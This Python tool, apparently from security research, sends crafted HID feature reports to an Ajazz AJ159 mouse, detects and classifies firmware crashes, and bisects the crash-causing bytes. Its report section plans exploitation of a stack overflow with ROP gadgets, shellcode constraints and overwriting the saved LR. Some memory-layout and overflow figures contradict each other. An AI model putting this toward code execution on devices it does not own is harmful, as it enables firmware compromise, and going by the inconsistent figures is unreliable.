#!/usr/bin/env python3
"""
crash_analyzer.py - Crash Detection and Analysis for Ajazz AJ159 APEX Mouse
=============================================================================

Monitors the AJ159 mouse for crashes/resets caused by HID protocol testing, and
provides analysis for vulnerability assessment. Can be used standalone or to
replay crash-inducing payloads from the tester log.

Crash types:
  - Soft crash: device resets via watchdog, re-enumerates as PID 0x4026
  - Hard crash: device enters boot mode, re-enumerates as PID 0x4025
  - Hang: device stops responding but does not re-enumerate

Analysis capabilities:
  - Detects exact moment of crash (continuous polling)
  - Records crash-inducing payload and context
  - Binary search to narrow down critical byte/bit
  - De Bruijn pattern offset identification for register analysis
  - Distinguishes crash types for analysis categorization
  - Generates analysis reports

Architecture context (ARM Cortex-M4F, nRF52840):
  - Little-endian, Thumb mode
  - Stack grows downward
  - No stack canaries, no ASLR
  - Flash base: 0x10000000, RAM base: 0x20000000
  - Stack typical range: 0x20000000-0x20040000
  - Code execution from stack possible (no XN by default)

SAFETY: MCUboot swap design means the device ALWAYS recovers:
  - Boot mode (PID 0x4025): power cycle or wait, device returns to normal
  - Normal mode (PID 0x4026): regular operation resumes after reset

PREREQUISITES:
  - Python 3.7+
  - pip install hidapi
  - Mouse connected via USB
  - Linux: run as root or configure udev rules

USAGE:
  python crash_analyzer.py --monitor                  # Continuous crash monitoring
  python crash_analyzer.py --payload "04400101..."    # Test specific payload (hex)
  python crash_analyzer.py --replay-log test.json     # Replay tester crash log
  python crash_analyzer.py --bisect "04400101..."     # Binary search crash byte
  python crash_analyzer.py --report crash_report.json # Generate analysis report
"""

from __future__ import annotations

import sys
import json
import time
import struct
import argparse
from datetime import datetime
from typing import Optional, List, Dict, Tuple, Any

# ===========================================================================
# Constants
# ===========================================================================

NORMAL_VID = 0x3151
NORMAL_PID = 0x4026
BOOT_VID = 0x3151
BOOT_PID = 0x4025
NORMAL_USAGE_PAGE = 0xFFFF
NORMAL_INTERFACE = 2

REPORT_SIZE = 64
REPORT_ID = 0x00

# Timing constants
POLL_INTERVAL_MS = 100    # How often to check device liveness
RECOVERY_TIMEOUT_S = 15   # Max wait for device re-enumeration
CRASH_CONFIRM_MS = 500    # Wait before confirming crash (not just USB hiccup)

# ARM Cortex-M4F memory regions (nRF52840)
MEMORY_MAP = {
    'flash_start': 0x00000000,
    'flash_end': 0x00100000,    # 1MB flash
    'ram_start': 0x20000000,
    'ram_end': 0x20040000,      # 256KB RAM
    'peripheral_start': 0x40000000,
    'app_code_start': 0x00010000,  # After MCUboot (64KB bootloader)
    'app_code_end': 0x0002C000,    # ~112KB app
}

# Stack frame layout at 0x1C1A8
STACK_FRAME = {
    'local_size': 60,    # SUB SP, #0x3C
    'saved_regs': ['R0', 'R1', 'R2', 'R3', 'R4', 'R5', 'R6', 'R7', 'LR'],
    'reg_offsets': {
        'R0': 60, 'R1': 64, 'R2': 68, 'R3': 72,
        'R4': 76, 'R5': 80, 'R6': 84, 'R7': 88, 'LR': 92,
    },
}


# ===========================================================================
# De Bruijn / Pattern Utilities
# ===========================================================================

def generate_pattern(length: int) -> bytes:
    """Generate a cyclic pattern for crash offset identification."""
    pattern = bytearray()
    upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    lower = 'abcdefghijklmnopqrstuvwxyz'
    digits = '0123456789'

    for u in upper:
        for l in lower:
            for d in digits:
                pattern.extend([ord(u), ord(l), ord(d), ord(d)])
                if len(pattern) >= length:
                    return bytes(pattern[:length])

    while len(pattern) < length:
        idx = len(pattern)
        pattern.append(idx & 0xFF)

    return bytes(pattern[:length])


def find_pattern_offset(pattern: bytes, value: int) -> int:
    """Find 4-byte value offset in pattern (little-endian)."""
    needle = struct.pack('<I', value)
    return pattern.find(needle)


def analyze_register_value(value: int) -> Dict[str, Any]:
    """Analyze a register value for memory region identification."""
    analysis = {
        'value': f'0x{value:08X}',
        'decimal': value,
        'region': 'unknown',
        'significance': '',
    }

    if MEMORY_MAP['flash_start'] <= value < MEMORY_MAP['flash_end']:
        analysis['region'] = 'flash'
        if MEMORY_MAP['app_code_start'] <= value < MEMORY_MAP['app_code_end']:
            analysis['significance'] = 'Points to app code (potential jump target)'
        else:
            analysis['significance'] = 'Points to flash (bootloader or unused)'
    elif MEMORY_MAP['ram_start'] <= value < MEMORY_MAP['ram_end']:
        analysis['region'] = 'ram'
        analysis['significance'] = 'Points to RAM (stack/heap/data)'
    elif MEMORY_MAP['peripheral_start'] <= value < 0x50000000:
        analysis['region'] = 'peripheral'
        analysis['significance'] = 'Points to peripheral registers'
    elif value == 0x00000000:
        analysis['significance'] = 'NULL pointer'
    elif value == 0xFFFFFFFF:
        analysis['significance'] = 'All ones (erased flash / invalid)'
    elif value & 1:
        analysis['significance'] = 'Odd address (Thumb bit set - valid code ptr)'

    return analysis


# ===========================================================================
# HID Helpers
# ===========================================================================

def require_hid():
    """Import and return the hid module."""
    try:
        import hid
        return hid
    except ImportError:
        sys.exit(
            "ERROR: The 'hidapi' package is required.\n"
            "Install with: pip install hidapi\n"
            "\n"
            "On Linux you may also need: sudo apt install libhidapi-dev"
        )


def find_device(hid_module, vid: int, pid: int) -> Optional[dict]:
    """Find device by VID/PID."""
    devices = hid_module.enumerate(vid, pid)
    if not devices:
        return None

    for d in devices:
        if (d.get('usage_page') == NORMAL_USAGE_PAGE and
                d.get('interface_number') == NORMAL_INTERFACE):
            return d

    for d in devices:
        if d.get('interface_number') == NORMAL_INTERFACE:
            return d

    for d in devices:
        if d.get('usage_page', 0) >= 0xFF00:
            return d

    return devices[0] if devices else None


def open_device(hid_module):
    """Open normal-mode device."""
    dev_info = find_device(hid_module, NORMAL_VID, NORMAL_PID)
    if not dev_info:
        print(f"  Device not found (VID={NORMAL_VID:#06x} PID={NORMAL_PID:#06x})")
        return None

    h = hid_module.device()
    try:
        h.open_path(dev_info['path'])
        return h
    except Exception as e:
        print(f"  Cannot open device: {e}")
        return None


def check_alive(device) -> bool:
    """Check if device responds."""
    try:
        resp = device.get_feature_report(0x04, REPORT_SIZE + 1)
        return resp is not None and len(resp) > 0
    except Exception:
        return False


def send_payload(device, payload: bytes) -> bool:
    """Send a 64-byte payload via SET_REPORT. Returns True if send succeeded."""
    try:
        send_buf = bytes([REPORT_ID]) + payload
        n = device.send_feature_report(send_buf)
        return n > 0
    except Exception:
        return False


def detect_recovery(hid_module, timeout_s: float = RECOVERY_TIMEOUT_S) -> Optional[str]:
    """
    Wait for device re-enumeration after crash.
    Returns: 'normal', 'boot', or None (timeout).
    """
    start = time.time()
    while time.time() - start < timeout_s:
        if find_device(hid_module, NORMAL_VID, NORMAL_PID):
            return 'normal'
        if find_device(hid_module, BOOT_VID, BOOT_PID):
            return 'boot'
        time.sleep(0.5)
    return None


# ===========================================================================
# Crash Detection
# ===========================================================================

class CrashEvent:
    """Records details of a crash event."""

    def __init__(self):
        self.timestamp = datetime.now().isoformat()
        self.payload = None          # The payload that caused the crash
        self.payload_hex = ''
        self.report_id = 0
        self.payloads_sent = 0       # Number of payloads sent before crash
        self.crash_type = None       # 'soft', 'hard', 'hang'
        self.recovery_time_s = 0.0   # Time to re-enumerate
        self.active_strategy = ''
        self.notes = ''
        self.register_analysis = {}  # Inferred register values

    def to_dict(self) -> Dict[str, Any]:
        return {
            'timestamp': self.timestamp,
            'payload_hex': self.payload_hex,
            'payload_len': len(self.payload) if self.payload else 0,
            'report_id': self.report_id,
            'report_id_hex': f'0x{self.report_id:02X}',
            'payloads_sent': self.payloads_sent,
            'crash_type': self.crash_type,
            'recovery_time_s': self.recovery_time_s,
            'active_strategy': self.active_strategy,
            'notes': self.notes,
            'register_analysis': self.register_analysis,
        }


def detect_crash(device, hid_module) -> Tuple[bool, Optional[str]]:
    """
    Check if device has crashed.
    Returns (crashed: bool, crash_type: str or None).
    """
    if check_alive(device):
        return False, None

    # Device not responding - wait to confirm it is a real crash
    time.sleep(CRASH_CONFIRM_MS / 1000.0)

    if check_alive(device):
        return False, None  # Was just a transient USB hiccup

    # Confirmed not responding - determine crash type
    try:
        device.close()
    except Exception:
        pass

    # Wait for re-enumeration
    start = time.time()
    recovery = detect_recovery(hid_module, timeout_s=RECOVERY_TIMEOUT_S)
    recovery_time = time.time() - start

    if recovery == 'normal':
        return True, 'soft'
    elif recovery == 'boot':
        return True, 'hard'
    else:
        return True, 'hang'


# ===========================================================================
# Analysis Functions
# ===========================================================================

def bisect_crash_byte(hid_module, base_payload: bytes, max_iterations: int = 20,
                      verbose: bool = False) -> Dict[str, Any]:
    """
    Binary search to find the exact byte that triggers a crash.

    Strategy: Start with the known crash payload. Zero out halves of the
    payload to narrow down which bytes are critical.
    """
    results = {
        'base_payload': base_payload.hex(),
        'iterations': [],
        'critical_range': None,
        'critical_bytes': None,
    }

    print(f"\n  Binary search for critical crash byte(s)...")
    print(f"  Base payload: {base_payload[:16].hex()}... ({len(base_payload)} bytes)")

    # First verify the base payload actually crashes
    device = open_device(hid_module)
    if device is None:
        print("  Cannot open device for bisection")
        results['error'] = 'cannot open device'
        return results

    send_payload(device, base_payload)
    time.sleep(0.5)
    crashed, _ = detect_crash(device, hid_module)

    if not crashed:
        print("  Base payload did not crash - cannot bisect")
        results['error'] = 'base payload does not crash'
        return results

    print(f"  Confirmed: base payload crashes device")

    # Wait for recovery before continuing
    time.sleep(2)

    # Binary search: narrow down the critical region
    low = 1  # Skip byte 0 (report ID) - always needed
    high = len(base_payload) - 1
    critical_low = low
    critical_high = high

    for iteration in range(max_iterations):
        if critical_high - critical_low <= 1:
            break

        mid = (critical_low + critical_high) // 2

        # Test 1: zero out bytes from mid to end
        test_payload = bytearray(base_payload)
        test_payload[mid:] = bytes(len(base_payload) - mid)

        device = open_device(hid_module)
        if device is None:
            time.sleep(3)
            device = open_device(hid_module)
            if device is None:
                results['error'] = f'device not available at iteration {iteration}'
                break

        send_payload(device, bytes(test_payload))
        time.sleep(0.5)
        crashed, crash_type = detect_crash(device, hid_module)

        iter_result = {
            'iteration': iteration,
            'tested_range': f'{critical_low}-{mid} (zeroed {mid}-{high})',
            'crashed': crashed,
            'crash_type': crash_type,
        }
        results['iterations'].append(iter_result)

        if verbose:
            status = f"CRASH ({crash_type})" if crashed else "no crash"
            print(f"    Iter {iteration}: zeroed [{mid}:{high}] -> {status}")

        if crashed:
            # Critical bytes are in the first half
            critical_high = mid
        else:
            # Critical bytes are in the zeroed region
            critical_low = mid

        # Wait for device recovery
        time.sleep(3)

    results['critical_range'] = {
        'start': critical_low,
        'end': critical_high,
        'bytes': base_payload[critical_low:critical_high + 1].hex(),
    }

    # Map to stack frame
    if critical_low >= STACK_FRAME['local_size']:
        overflow_offset = critical_low - STACK_FRAME['local_size']
        reg_idx = overflow_offset // 4
        if reg_idx < len(STACK_FRAME['saved_regs']):
            target_reg = STACK_FRAME['saved_regs'][reg_idx]
            results['critical_bytes'] = {
                'offset_in_payload': critical_low,
                'offset_in_overflow': overflow_offset,
                'target_register': target_reg,
                'significance': f'Overwrites saved {target_reg} on stack',
            }

    print(f"\n  Result: Critical bytes at offset {critical_low}-{critical_high}")
    if results.get('critical_bytes'):
        cb = results['critical_bytes']
        print(f"  Target: {cb['target_register']} "
              f"(overflow offset {cb['offset_in_overflow']})")

    return results


def analyze_crash_payload(payload: bytes) -> Dict[str, Any]:
    """
    Analyze a crash-inducing payload to understand what it corrupts.
    Maps payload bytes to the stack frame layout.
    """
    analysis = {
        'payload_length': len(payload),
        'report_id': payload[0] if payload else 0,
        'report_id_hex': f'0x{payload[0]:02X}' if payload else '0x00',
        'stack_corruption': {},
        'overflow_bytes': {},
        'register_values': {},
    }

    if len(payload) < REPORT_SIZE:
        analysis['notes'] = 'Payload shorter than 64 bytes'
        return analysis

    # The interesting part: bytes that overflow the 60-byte stack buffer
    overflow_start = STACK_FRAME['local_size']  # byte 60

    if len(payload) > overflow_start:
        overflow_data = payload[overflow_start:]
        analysis['overflow_bytes'] = {
            'hex': overflow_data.hex(),
            'length': len(overflow_data),
            'start_offset': overflow_start,
        }

        # Map overflow bytes to registers
        for reg_name, offset in STACK_FRAME['reg_offsets'].items():
            if offset + 4 <= len(payload):
                value = struct.unpack_from('<I', payload, offset)[0]
                reg_analysis = analyze_register_value(value)
                reg_analysis['payload_offset'] = offset
                analysis['register_values'][reg_name] = reg_analysis

    # Check if payload uses De Bruijn pattern
    pattern = generate_pattern(REPORT_SIZE)
    if payload[1:8] == pattern[1:8]:
        analysis['uses_debruijn'] = True
        # Check what value would be in each overwritten register
        for reg_name, offset in STACK_FRAME['reg_offsets'].items():
            if offset + 4 <= len(pattern):
                value = struct.unpack_from('<I', pattern, offset)[0]
                pat_offset = find_pattern_offset(pattern, value)
                analysis['register_values'].setdefault(reg_name, {})
                analysis['register_values'][reg_name]['pattern_offset'] = pat_offset
    else:
        analysis['uses_debruijn'] = False

    return analysis


def generate_analysis_report(crashes: List[CrashEvent],
                            bisect_results: Optional[Dict] = None) -> Dict[str, Any]:
    """Generate a comprehensive report for vulnerability analysis."""
    report = {
        'generated': datetime.now().isoformat(),
        'target': {
            'device': 'Ajazz AJ159 APEX Gaming Mouse',
            'mcu': 'nRF52840 (ARM Cortex-M4F)',
            'rtos': 'Zephyr',
            'vid': f'0x{NORMAL_VID:04X}',
            'pid_normal': f'0x{NORMAL_PID:04X}',
            'pid_boot': f'0x{BOOT_PID:04X}',
        },
        'vulnerability': {
            'type': 'Stack buffer overflow via HID SET_REPORT',
            'handler_address': '0x1C1A8',
            'buffer_size': 60,
            'input_size': 64,
            'overflow_size': 4,
            'mitigations': 'None (no canary, no ASLR, no XN)',
        },
        'crashes': [c.to_dict() for c in crashes],
        'crash_summary': {
            'total': len(crashes),
            'soft': sum(1 for c in crashes if c.crash_type == 'soft'),
            'hard': sum(1 for c in crashes if c.crash_type == 'hard'),
            'hang': sum(1 for c in crashes if c.crash_type == 'hang'),
        },
        'bisection': bisect_results,
        'analysis_notes': {
            'stack_executable': True,
            'shellcode_max_size': 'Limited by report size (64 bytes) or multi-stage',
            'useful_gadgets': [
                'Any BLX/BX instruction in flash for ROP',
                'memcpy at known addresses for stage-2 loading',
            ],
            'constraints': [
                'Shellcode must be Thumb mode (LSB of target address = 1)',
                'Report ID byte (byte 0) limits first byte of payload',
                'Validation gate may reject some byte combinations',
                'Deferred processing means crash may not be immediate',
            ],
            'recommended_targets': [
                'Overwrite LR to redirect return (need >= 33 bytes overflow)',
                'Overwrite R0-R7 to control function arguments',
                'If memcpy path reached: larger overflow for full ROP chain',
            ],
        },
    }

    # Add specific recommendations based on crash data
    if crashes:
        hard_crashes = [c for c in crashes if c.crash_type == 'hard']
        if hard_crashes:
            report['analysis_notes']['verdict'] = (
                'SIGNIFICANT - device enters boot mode on crash, indicating '
                'control flow corruption. Next: identify exact register '
                'overwritten and analyze behavior.'
            )
        else:
            report['analysis_notes']['verdict'] = (
                'POTENTIALLY SIGNIFICANT - crashes detected but device '
                'recovers to normal mode. May need more precise payload '
                'to achieve different behavior vs simple fault.'
            )
    else:
        report['analysis_notes']['verdict'] = (
            'NOT YET CONFIRMED - no crashes observed. Try different '
            'report IDs, payload structures, or timing variations.'
        )

    return report


# ===========================================================================
# Command Handlers
# ===========================================================================

def cmd_monitor(args, hid_module):
    """Continuous monitoring mode - poll device and report crashes."""
    print(f"\n  Monitoring device for crashes (Ctrl-C to stop)...")
    print(f"  Poll interval: {args.poll_interval}ms")
    print()

    device = open_device(hid_module)
    if device is None:
        sys.exit("ERROR: Cannot open device for monitoring")

    crashes = []
    poll_count = 0

    try:
        while True:
            alive = check_alive(device)
            poll_count += 1

            if not alive:
                print(f"\n  [!!!] Device stopped responding at poll #{poll_count}!")
                print(f"        Time: {datetime.now().isoformat()}")

                crash = CrashEvent()
                crash.active_strategy = 'monitor'
                crash.payloads_sent = poll_count

                # Determine crash type
                try:
                    device.close()
                except Exception:
                    pass

                start = time.time()
                recovery = detect_recovery(hid_module)
                crash.recovery_time_s = time.time() - start

                if recovery == 'normal':
                    crash.crash_type = 'soft'
                    print(f"        Recovery: NORMAL mode "
                          f"({crash.recovery_time_s:.1f}s)")
                    device = open_device(hid_module)
                elif recovery == 'boot':
                    crash.crash_type = 'hard'
                    print(f"        Recovery: BOOT mode! "
                          f"({crash.recovery_time_s:.1f}s)")
                    print(f"        [!!!] Device entered bootloader!")
                else:
                    crash.crash_type = 'hang'
                    print(f"        Recovery: TIMEOUT (device hung)")

                crashes.append(crash)
                print(f"        Total crashes: {len(crashes)}")

                if recovery is None:
                    print("        Cannot continue - device not responding")
                    break

            else:
                if poll_count % 100 == 0:
                    sys.stdout.write(f"\r  Polls: {poll_count}, "
                                     f"crashes: {len(crashes)}")
                    sys.stdout.flush()

            time.sleep(args.poll_interval / 1000.0)

    except KeyboardInterrupt:
        print(f"\n\n  Monitoring stopped. Total polls: {poll_count}, "
              f"crashes: {len(crashes)}")

    finally:
        try:
            device.close()
        except Exception:
            pass

    return crashes


def cmd_test_payload(args, hid_module):
    """Test a specific payload for crash."""
    payload_hex = args.payload.replace(' ', '').replace('0x', '')
    try:
        payload = bytes.fromhex(payload_hex)
    except ValueError:
        sys.exit(f"ERROR: Invalid hex payload: {args.payload}")

    if len(payload) != REPORT_SIZE:
        if len(payload) < REPORT_SIZE:
            payload = payload + bytes(REPORT_SIZE - len(payload))
            print(f"  Padded payload to {REPORT_SIZE} bytes with zeros")
        else:
            payload = payload[:REPORT_SIZE]
            print(f"  Truncated payload to {REPORT_SIZE} bytes")

    print(f"\n  Testing payload: {payload.hex()}")
    print(f"  Report ID: 0x{payload[0]:02X}")
    print(f"  Length: {len(payload)} bytes")
    print()

    # Analyze the payload structure
    analysis = analyze_crash_payload(payload)
    if analysis['overflow_bytes']:
        print(f"  Overflow bytes (60-63): "
              f"{analysis['overflow_bytes']['hex']}")
        if analysis['register_values']:
            for reg, info in analysis['register_values'].items():
                print(f"    {reg}: {info.get('value', 'N/A')} "
                      f"- {info.get('significance', '')}")
    print()

    # Send and check for crash
    device = open_device(hid_module)
    if device is None:
        sys.exit("ERROR: Cannot open device")

    print(f"  Sending payload...")
    sent = send_payload(device, payload)
    if not sent:
        print(f"  FAILED to send payload")
        device.close()
        return []

    print(f"  Sent OK. Checking device status...")
    time.sleep(0.5)

    crashed, crash_type = detect_crash(device, hid_module)

    crash_events = []
    if crashed:
        print(f"\n  [!!!] CRASH DETECTED!")
        print(f"        Type: {crash_type}")

        crash = CrashEvent()
        crash.payload = payload
        crash.payload_hex = payload.hex()
        crash.report_id = payload[0]
        crash.crash_type = crash_type
        crash.active_strategy = 'manual_test'
        crash.notes = f"Tested payload: {payload.hex()}"
        crash_events.append(crash)

        # If requested, do bisection
        if args.bisect:
            print(f"\n  Starting binary search for critical byte...")
            bisect_results = bisect_crash_byte(hid_module, payload,
                                               verbose=args.verbose)
            crash.register_analysis = bisect_results
    else:
        print(f"  Device still responding - no crash from this payload")
        try:
            device.close()
        except Exception:
            pass

    return crash_events


def cmd_replay_log(args, hid_module):
    """Replay payloads from a tester JSON log file."""
    try:
        with open(args.replay_log, 'r') as f:
            log_data = json.load(f)
    except (OSError, json.JSONDecodeError) as e:
        sys.exit(f"ERROR: Cannot read log file: {e}")

    # Find crash-inducing payloads
    results = log_data.get('results', [])
    crash_payloads = [r for r in results if not r.get('device_alive', True)]

    if not crash_payloads:
        print(f"  No crash payloads found in log file")
        print(f"  Total entries: {len(results)}")

        # If --all flag, replay everything
        if args.replay_all:
            print(f"  Replaying all {len(results)} payloads...")
            replay_targets = results
        else:
            return []
    else:
        print(f"  Found {len(crash_payloads)} crash payloads in log")
        replay_targets = crash_payloads

    crash_events = []
    for idx, entry in enumerate(replay_targets):
        payload_hex = entry.get('payload_hex', '')
        if not payload_hex:
            continue

        try:
            payload = bytes.fromhex(payload_hex)
        except ValueError:
            continue

        if len(payload) != REPORT_SIZE:
            if len(payload) < REPORT_SIZE:
                payload = payload + bytes(REPORT_SIZE - len(payload))
            else:
                payload = payload[:REPORT_SIZE]

        print(f"\n  [{idx+1}/{len(replay_targets)}] "
              f"Replaying: ID=0x{payload[0]:02X} "
              f"strategy={entry.get('strategy', 'unknown')}")

        device = open_device(hid_module)
        if device is None:
            print(f"    Waiting for device...")
            time.sleep(3)
            device = open_device(hid_module)
            if device is None:
                print(f"    Device not available, skipping")
                continue

        sent = send_payload(device, payload)
        if not sent:
            print(f"    Failed to send")
            try:
                device.close()
            except Exception:
                pass
            continue

        time.sleep(0.5)
        crashed, crash_type = detect_crash(device, hid_module)

        if crashed:
            print(f"    [!!!] CRASH confirmed! Type: {crash_type}")
            crash = CrashEvent()
            crash.payload = payload
            crash.payload_hex = payload.hex()
            crash.report_id = payload[0]
            crash.crash_type = crash_type
            crash.active_strategy = entry.get('strategy', 'replay')
            crash.notes = entry.get('notes', '')
            crash_events.append(crash)

            # Wait for recovery
            time.sleep(3)
        else:
            print(f"    No crash (device still alive)")
            try:
                device.close()
            except Exception:
                pass

    return crash_events


# ===========================================================================
# Main
# ===========================================================================

def main():
    parser = argparse.ArgumentParser(
        description="AJ159 APEX - Crash Detection and Analysis",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Modes of operation:
  --monitor       Continuously poll device for crashes (use with protocol tester)
  --payload HEX   Test a specific payload for crash
  --replay-log F  Replay crash payloads from tester JSON log
  --bisect        Binary search for critical byte (use with --payload)

Crash types:
  soft  - Device resets to normal mode (watchdog reset)
  hard  - Device enters boot mode (severe fault, significant!)
  hang  - Device stops responding, no re-enumeration

SAFETY: MCUboot swap design means device ALWAYS recovers.
  Power cycle recovers from any state. No permanent damage possible.

Examples:
  %(prog)s --monitor                             # Watch for crashes
  %(prog)s --payload "13400101AABBCCDD..."       # Test hex payload
  %(prog)s --payload "13400101" --bisect         # Find critical byte
  %(prog)s --replay-log test_log.json            # Replay tester output
  %(prog)s --report crash_report.json            # Save analysis report
        """
    )

    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument(
        '--monitor', action='store_true',
        help='Continuous crash monitoring mode'
    )
    mode.add_argument(
        '--payload', type=str,
        help='Test specific payload (hex string, e.g. "04400101...")'
    )
    mode.add_argument(
        '--replay-log', type=str,
        help='Replay crash payloads from tester JSON log file'
    )

    parser.add_argument(
        '--bisect', action='store_true',
        help='Binary search for critical crash byte (with --payload)'
    )
    parser.add_argument(
        '--replay-all', action='store_true',
        help='Replay all payloads from log, not just crashes'
    )
    parser.add_argument(
        '--poll-interval', type=float, default=POLL_INTERVAL_MS,
        help=f'Polling interval in ms for --monitor (default: {POLL_INTERVAL_MS})'
    )
    parser.add_argument(
        '--report', type=str, default=None,
        help='Save analysis report to JSON file'
    )
    parser.add_argument(
        '-v', '--verbose', action='store_true',
        help='Verbose output'
    )

    args = parser.parse_args()

    print()
    print("=" * 70)
    print("  AJ159 APEX - Crash Detection and Analysis")
    print("  Target: VID 0x3151, PID 0x4026 (normal) / 0x4025 (boot)")
    print("=" * 70)
    print()
    print("  WARNING: This tool monitors for and intentionally reproduces")
    print("  device crashes. MCUboot swap design ensures safe recovery.")
    print("  If device hangs: unplug/replug USB cable.")
    print()

    hid = require_hid()

    # Verify device is initially reachable
    dev_info = find_device(hid, NORMAL_VID, NORMAL_PID)
    boot_info = find_device(hid, BOOT_VID, BOOT_PID)

    if dev_info:
        print(f"  [*] Device found in NORMAL mode (PID 0x4026)")
    elif boot_info:
        print(f"  [*] Device found in BOOT mode (PID 0x4025)")
        print(f"      Power cycle to return to normal mode for testing")
        if not args.monitor:
            sys.exit(1)
    else:
        print(f"  [!] No device found. Connect mouse and try again.")
        sys.exit(1)

    # Execute selected mode
    crashes = []

    if args.monitor:
        crashes = cmd_monitor(args, hid)
    elif args.payload:
        crashes = cmd_test_payload(args, hid)
    elif args.replay_log:
        crashes = cmd_replay_log(args, hid)

    # Generate report if requested
    if args.report and crashes:
        report = generate_analysis_report(crashes)
        with open(args.report, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"\n  [*] Analysis report saved to: {args.report}")
    elif args.report and not crashes:
        print(f"\n  No crashes to report.")

    # Final summary
    if crashes:
        print(f"\n{'='*70}")
        print(f"  CRASH SUMMARY")
        print(f"{'='*70}\n")

        for i, c in enumerate(crashes):
            print(f"  Crash {i+1}:")
            print(f"    Type: {c.crash_type}")
            print(f"    Report ID: 0x{c.report_id:02X}")
            if c.payload_hex:
                print(f"    Payload: {c.payload_hex[:64]}...")
            print(f"    Strategy: {c.active_strategy}")
            print()

        print(f"  Total: {len(crashes)} crash(es)")
        soft = sum(1 for c in crashes if c.crash_type == 'soft')
        hard = sum(1 for c in crashes if c.crash_type == 'hard')
        hang = sum(1 for c in crashes if c.crash_type == 'hang')
        print(f"    Soft (watchdog reset): {soft}")
        print(f"    Hard (boot mode):      {hard}")
        print(f"    Hang (no recovery):    {hang}")

        if hard > 0:
            print(f"\n  [!!!] HARD CRASHES DETECTED - device enters boot mode!")
            print(f"        This strongly suggests control flow corruption.")
            print(f"        Next: use --bisect to find exact overflow offset,")
            print(f"        then craft shellcode for code execution.")
    else:
        print(f"\n  No crashes detected in this session.")


if __name__ == "__main__":
    main()
